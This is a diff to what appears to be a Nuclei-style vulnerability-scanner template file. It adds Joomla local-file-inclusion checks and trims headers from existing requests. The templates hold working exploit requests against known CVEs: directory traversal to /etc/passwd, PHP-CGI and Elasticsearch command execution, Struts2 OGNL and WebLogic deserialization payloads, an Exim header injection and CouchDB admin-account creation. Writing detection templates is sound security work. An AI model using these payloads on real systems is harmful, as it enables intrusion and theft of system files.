@@ -523,7 +523,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /scripts/setup.php HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 80\n\naction=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";}\n"
+            "POST /scripts/setup.php HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\naction=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";}\n"
           ]
         }
       ]
@@ -974,6 +974,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_joomlaupdater&controller=../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1308",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the SVMap (com_svmap) component 1.1.1 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component SVMap 1.1.1 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12066",
+          "https://www.cvedetails.com/cve/CVE-2010-1308"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_svmap&controller=../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -1978,6 +2015,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1719",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the MT Fire Eagle (com_mtfireeagle) component 1.2 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component MT Fire Eagle 1.2 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12233",
+          "https://www.cvedetails.com/cve/CVE-2010-1719"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_mtfireeagle&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1722",
       "info": {
         "author": "daffainfo",
@@ -2380,6 +2454,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_perchacategoriestree&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-2034",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Percha Image Attach (com_perchaimageattach) component 1.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Percha Image Attach 1.1 - Directory Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/34003",
+          "https://www.cvedetails.com/cve/CVE-2010-2034"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_perchaimageattach&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -3509,7 +3620,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 31\n\n<?php echo shell_exec(\"cat /etc/passwd\"); ?>\n"
+            "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n<?php echo shell_exec(\"cat /etc/passwd\"); ?>\n"
           ]
         }
       ]
@@ -4567,7 +4678,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /_search?pretty HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 343\n\n{\n    \"size\": 1,\n    \"query\": {\n      \"filtered\": {\n        \"query\": {\n          \"match_all\": {\n          }\n        }\n      }\n    },\n    \"script_fields\": {\n        \"command\": {\n            \"script\": \"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\"cat /etc/passwd\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\"\n        }\n    }\n}\n"
+            "POST /_search?pretty HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: application/x-www-form-urlencoded\n\n{\n    \"size\": 1,\n    \"query\": {\n      \"filtered\": {\n        \"query\": {\n          \"match_all\": {\n          }\n        }\n      }\n    },\n    \"script_fields\": {\n        \"command\": {\n            \"script\": \"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\"cat /etc/passwd\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\"\n        }\n    }\n}\n"
           ]
         }
       ]
@@ -5140,8 +5251,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /website/blog/ HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 343\n\n{\n  \"name\": \"test\"\n}\n",
-            "POST /_search HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 343\n\n{\"size\":1, \"script_fields\": {\"lupin\":{\"lang\":\"groovy\",\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"cat /etc/passwd\\\").getText()\"}}}\n"
+            "POST /website/blog/ HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: application/x-www-form-urlencoded\n\n{\n  \"name\": \"test\"\n}\n",
+            "POST /_search HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\n{\"size\":1, \"script_fields\": {\"lupin\":{\"lang\":\"groovy\",\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"cat /etc/passwd\\\").getText()\"}}}\n"
           ]
         }
       ]
@@ -6798,8 +6909,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /?author=1 HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n",
-            "POST /wp-login.php?action=lostpassword HTTP/1.1\nHost: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)\nConnection: close\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nAccept: */*\nContent-Length: 56\nContent-Type: application/x-www-form-urlencoded\n\nwp-submit=Get+New+Password&redirect_to=&user_login={{username}}\n\n"
+            "GET /?author=1 HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n\n",
+            "POST /wp-login.php?action=lostpassword HTTP/1.1\nHost: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\nwp-submit=Get+New+Password&redirect_to=&user_login={{username}}\n\n"
           ],
           "unsafe": true
         }
@@ -7034,7 +7145,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 4\n"
+            "GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -7301,7 +7412,7 @@
             }
           ],
           "raw": [
-            "POST /javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nContent-Length: 160\nAccept: */*\nAccept-Language: en\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\npfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe704aOkNwaB12Cc3Iq6NmBo%2BQZuqhqtPxdTA%3D%3D\n"
+            "POST /javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\npfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe704aOkNwaB12Cc3Iq6NmBo%2BQZuqhqtPxdTA%3D%3D\n"
           ]
         }
       ]
@@ -7367,7 +7478,7 @@
             }
           ],
           "raw": [
-            "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: text/xml\nContent-Length: 5178\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n            <java>\n                <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\">\n                    <string>0xcafebabe0000003200670a001700350800360a003700380a0039003a08003b0a0039003c07003d0a0007003508003e0a0039003f0a003900400b004100420800430800440800450800460700470a001100480a001100490a0011004a0a004b004c07004d07004e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301001e4c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578703b010003736179010029284c6a6176612f6c616e672f537472696e673b294c6a6176612f696f2f496e70757453747265616d3b010003636d640100124c6a6176612f6c616e672f537472696e673b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b0100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b01000d537461636b4d61705461626c6507004f07005001000a457863657074696f6e7307005101000a536f7572636546696c6501000b586d6c4578702e6a6176610c001800190100076f732e6e616d650700520c0053005407004f0c0055005601000377696e0c005700580100136a6176612f7574696c2f41727261794c697374010004244e4f240c0059005a0c005b005c0700500c005d005e0100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c0018005f0c006000610c006200630700640c0065006601001c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578700100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100136a6176612f6c616e672f457863657074696f6e0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0021001600170000000000020001001800190001001a0000002f00010001000000052ab70001b100000002001b00000006000100000007001c0000000c000100000005001d001e00000001001f00200002001a0000016f000300070000009c043d1202b800034e2dc600112db600041205b60006990005033dbb000759b700083a042b1209b6000a99001319042b07b6000bb9000c020057a700441c9900231904120db9000c0200571904120eb9000c02005719042bb9000c020057a700201904120fb9000c02005719041210b9000c02005719042bb9000c020057bb0011591904b700123a05190504b60013571905b600143a061906b60015b000000004001b0000004a001200000012000200130008001400180015001a00180023001a002c001b003c001c0040001d004a001e0054001f00600021006a002200740023007d002600880027008f002800960029001c0000004800070000009c001d001e00000000009c0021002200010002009a00230024000200080094002500220003002300790026002700040088001400280029000500960006002a002b0006002c0000000c0001002300790026002d0004002e000000110004fd001a0107002ffc0021070030231c0031000000040001003200010033000000020034</string>\n                </void>\n                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n                    <void method=\"defineClass\">\n                        <string>com.supeream.exploits.XmlExp</string>\n                        <object idref=\"cls\"></object>\n                        <void method=\"newInstance\">\n                            <void method=\"say\" id=\"proc\">\n                                <string>cat /etc/passwd</string>\n                            </void>\n                        </void>\n                    </void>\n                </void>\n                <void class=\"java.lang.Thread\" method=\"currentThread\">\n                    <void method=\"getCurrentWork\">\n                        <void method=\"getResponse\">\n                            <void method=\"getServletOutputStream\">\n                                <void method=\"writeStream\">\n                                    <object idref=\"proc\"></object>\n                                </void>\n                                <void method=\"flush\"/>\n                            </void>\n                            <void method=\"getWriter\"><void method=\"write\"><string></string></void></void>\n                        </void>\n                    </void>\n                </void>\n            </java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>\n"
+            "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n            <java>\n                <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\">\n                    <string>0xcafebabe0000003200670a001700350800360a003700380a0039003a08003b0a0039003c07003d0a0007003508003e0a0039003f0a003900400b004100420800430800440800450800460700470a001100480a001100490a0011004a0a004b004c07004d07004e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301001e4c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578703b010003736179010029284c6a6176612f6c616e672f537472696e673b294c6a6176612f696f2f496e70757453747265616d3b010003636d640100124c6a6176612f6c616e672f537472696e673b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b0100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b01000d537461636b4d61705461626c6507004f07005001000a457863657074696f6e7307005101000a536f7572636546696c6501000b586d6c4578702e6a6176610c001800190100076f732e6e616d650700520c0053005407004f0c0055005601000377696e0c005700580100136a6176612f7574696c2f41727261794c697374010004244e4f240c0059005a0c005b005c0700500c005d005e0100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c0018005f0c006000610c006200630700640c0065006601001c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578700100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100136a6176612f6c616e672f457863657074696f6e0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0021001600170000000000020001001800190001001a0000002f00010001000000052ab70001b100000002001b00000006000100000007001c0000000c000100000005001d001e00000001001f00200002001a0000016f000300070000009c043d1202b800034e2dc600112db600041205b60006990005033dbb000759b700083a042b1209b6000a99001319042b07b6000bb9000c020057a700441c9900231904120db9000c0200571904120eb9000c02005719042bb9000c020057a700201904120fb9000c02005719041210b9000c02005719042bb9000c020057bb0011591904b700123a05190504b60013571905b600143a061906b60015b000000004001b0000004a001200000012000200130008001400180015001a00180023001a002c001b003c001c0040001d004a001e0054001f00600021006a002200740023007d002600880027008f002800960029001c0000004800070000009c001d001e00000000009c0021002200010002009a00230024000200080094002500220003002300790026002700040088001400280029000500960006002a002b0006002c0000000c0001002300790026002d0004002e000000110004fd001a0107002ffc0021070030231c0031000000040001003200010033000000020034</string>\n                </void>\n                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n                    <void method=\"defineClass\">\n                        <string>com.supeream.exploits.XmlExp</string>\n                        <object idref=\"cls\"></object>\n                        <void method=\"newInstance\">\n                            <void method=\"say\" id=\"proc\">\n                                <string>cat /etc/passwd</string>\n                            </void>\n                        </void>\n                    </void>\n                </void>\n                <void class=\"java.lang.Thread\" method=\"currentThread\">\n                    <void method=\"getCurrentWork\">\n                        <void method=\"getResponse\">\n                            <void method=\"getServletOutputStream\">\n                                <void method=\"writeStream\">\n                                    <object idref=\"proc\"></object>\n                                </void>\n                                <void method=\"flush\"/>\n                            </void>\n                            <void method=\"getWriter\"><void method=\"write\"><string></string></void></void>\n                        </void>\n                    </void>\n                </void>\n            </java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>\n"
           ]
         }
       ]
@@ -7660,7 +7771,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "PUT /_users/org.couchdb.user:poc HTTP/1.1\nHost:  {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: application/json\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length: 108\n\n{\n  \"type\": \"user\",\n  \"name\": \"poc\",\n  \"roles\": [\"_admin\"],\n  \"roles\": [],\n  \"password\": \"123456\"\n}\n"
+            "PUT /_users/org.couchdb.user:poc HTTP/1.1\nHost:  {{Hostname}}\nAccept: application/json\n\n{\n  \"type\": \"user\",\n  \"name\": \"poc\",\n  \"roles\": [\"_admin\"],\n  \"roles\": [],\n  \"password\": \"123456\"\n}\n"
           ]
         }
       ]
@@ -7819,8 +7930,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /maint/index.php?packages HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nReferer: {{Hostname}}/maint/index.php?packages\nContent-Length: 160\nCookie: lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2\nAuthorization: Basic bWFpbnQ6cGFzc3dvcmQ=\nConnection: keep-alive\n\nxajax=menu&xajaxr=1504969293893&xajaxargs[]=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&xajaxargs[]=yumPackages\n",
-            "GET /maint/modules/home/index.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00english HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nReferer: {{Hostname}}/maint/index.php?packages\nCookie: lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2\nAuthorization: Basic bWFpbnQ6cGFzc3dvcmQ=\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\n"
+            "POST /maint/index.php?packages HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{Hostname}}/maint/index.php?packages\nCookie: lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2\nAuthorization: Basic bWFpbnQ6cGFzc3dvcmQ=\n\nxajax=menu&xajaxr=1504969293893&xajaxargs[]=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&xajaxargs[]=yumPackages\n",
+            "GET /maint/modules/home/index.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00english HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nReferer: {{Hostname}}/maint/index.php?packages\nCookie: lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2\nAuthorization: Basic bWFpbnQ6cGFzc3dvcmQ=\n"
           ]
         }
       ]
@@ -7954,8 +8065,8 @@
             }
           ],
           "raw": [
-            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 264\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryKc8fBVDo558U4hbJ\nAccept-Encoding: gzip, deflate\nConnection: close\n\n------WebKitFormBoundaryKc8fBVDo558U4hbJ\nContent-Disposition: form-data; name=\"file\"; filename=\"{{randstr}}.php\"\n\n{{randstr_1}}\n\n------WebKitFormBoundaryKc8fBVDo558U4hbJ\nContent-Disposition: form-data; name=\"name\"\n\n{{randstr}}.php\\x0A\n------WebKitFormBoundaryKc8fBVDo558U4hbJ--\n",
-            "GET /{{randstr}}.php\\x0A HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip,deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\n"
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryKc8fBVDo558U4hbJ\n\n------WebKitFormBoundaryKc8fBVDo558U4hbJ\nContent-Disposition: form-data; name=\"file\"; filename=\"{{randstr}}.php\"\n\n{{randstr_1}}\n\n------WebKitFormBoundaryKc8fBVDo558U4hbJ\nContent-Disposition: form-data; name=\"name\"\n\n{{randstr}}.php\\x0A\n------WebKitFormBoundaryKc8fBVDo558U4hbJ--\n",
+            "GET /{{randstr}}.php\\x0A HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip,deflate\nAccept: */*\n"
           ],
           "req-condition": true
         }
@@ -8305,7 +8416,7 @@
             ]
           },
           "raw": [
-            "GET /cgi-bin/§endpoint§?LD_DEBUG=help HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nAccept: */*\nConnection: close\n"
+            "GET /cgi-bin/{{endpoint}}?LD_DEBUG=help HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
           ],
           "stop-at-first-match": true
         }
@@ -8458,7 +8569,7 @@
             }
           ],
           "raw": [
-            "POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0,\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,\nContent-Type: text/xml;charset=UTF-8\nContent-Length: 873\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n      <java version=\"1.8\" class=\"java.beans.XMLDecoder\">\n        <void id=\"url\" class=\"java.net.URL\">\n          <string>http://{{interactsh-url}}</string>\n        </void>\n        <void idref=\"url\">\n          <void id=\"stream\" method =\"openStream\"/>\n        </void>\n      </java>\n    </work:WorkContext>\n    </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>\n"
+            "POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,\nContent-Type: text/xml;charset=UTF-8\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n      <java version=\"1.8\" class=\"java.beans.XMLDecoder\">\n        <void id=\"url\" class=\"java.net.URL\">\n          <string>http://{{interactsh-url}}</string>\n        </void>\n        <void idref=\"url\">\n          <void id=\"stream\" method =\"openStream\"/>\n        </void>\n      </java>\n    </work:WorkContext>\n    </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>\n"
           ]
         }
       ]
@@ -8697,7 +8808,7 @@
             }
           ],
           "raw": [
